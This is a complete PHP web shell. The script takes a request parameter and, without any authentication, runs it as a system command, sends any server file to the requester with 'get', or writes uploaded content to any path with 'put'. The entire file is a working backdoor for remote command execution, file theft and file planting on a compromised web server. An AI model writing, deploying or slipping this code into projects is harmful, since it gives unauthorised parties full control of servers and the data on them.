<?php 

  $cmd = $_REQUEST['c'];
  $cmd = trim($cmd);


  if (substr($cmd, 0, 4) === 'get ') {
    $c = explode(' ', $cmd);
    $path = $c[1];
    if (!file_exists($path)) {
      echo '$path not found';
      die;
    }
    header("Content-Disposition: attachment; filename=$path");
    header("Content-Type: application/octet-stream");
    header("Content-Transfer-Encoding: binary");
    header('Content-Length: ' . filesize($path));
    readfile($path);
    die;
  } else if (substr($cmd, 0, 4) === 'put ') {
    $c = explode(' ', $cmd);
    $fileName = $c[1];
    $destPath = basename($c[1]);
    if (count($c) > 2) {
      $destPath = $c[2];
    }
    if (file_exists($destPath)) {
      echo $destPath.' already exists';
      die;
    }
    file_put_contents($destPath, file_get_contents('php://input'));
    echo 'Uploaded '.$fileName.' to '.$destPath;
    die;
  }
  system($cmd);
  die;

?>
